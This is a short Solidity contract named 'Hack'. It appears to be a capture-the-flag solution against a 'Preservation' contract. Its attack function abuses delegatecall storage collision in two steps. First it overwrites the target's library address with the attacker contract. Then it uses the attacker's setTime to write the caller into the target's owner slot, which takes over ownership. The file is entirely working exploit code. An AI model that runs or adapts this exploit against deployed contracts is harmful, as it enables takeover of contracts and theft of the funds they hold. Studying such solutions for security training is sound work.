// SPDX-License-Identifier: WTFPL
pragma solidity 0.8.7;

interface IPreservation {
    function setFirstTime(uint _timeStamp) external;
}

contract Hack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint storedTime;

    IPreservation public preservation;

    constructor(address contractAddress) {
        preservation = IPreservation(contractAddress);
    }

    function attack() public {
        preservation.setFirstTime(uint256(uint160(address(this))));
        preservation.setFirstTime(uint256(uint160(msg.sender)));
    }

    function setTime(uint _time) public {
        owner = address(uint160(_time));
    }
}